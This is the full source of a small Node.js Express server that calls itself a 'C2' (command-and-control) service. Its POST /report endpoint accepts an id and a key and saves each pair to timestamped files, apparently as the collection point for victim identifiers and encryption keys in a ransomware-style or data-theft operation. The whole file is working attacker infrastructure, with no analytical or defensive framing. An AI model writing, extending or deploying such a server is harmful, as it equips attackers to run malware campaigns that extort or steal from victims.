import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import helmet from 'helmet';
import morgan from 'morgan';

// __dirname for ES Modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const PORT = process.env.PORT || 3000;
const REPORTS_DIR = path.join(__dirname, 'reports');

if (!fs.existsSync(REPORTS_DIR)) fs.mkdirSync(REPORTS_DIR);
app.use(helmet());
app.use(express.json());
app.use(morgan('combined'));

app.post('/report', (req, res) => {
  const { id, key } = req.body;
  if (!id || !key) return res.status(400).json({ error: 'Missing id or key' });
  const ts = Date.now();
  const safeId = id.replace(/[^\w-]/g, '_');
  const filename = `${ts}_${safeId}.txt`;
  fs.writeFileSync(path.join(REPORTS_DIR, filename),
    `ID: ${id}\nKEY: ${key}\nTS: ${new Date(ts).toISOString()}\n`);
  console.log(`Saved ${filename}`);
  res.json({ status: 'ok' });
});

app.get('/healthz', (req, res) => res.send('C2 up'));
app.listen(PORT, () => console.log(`C2 listening on ${PORT}`));
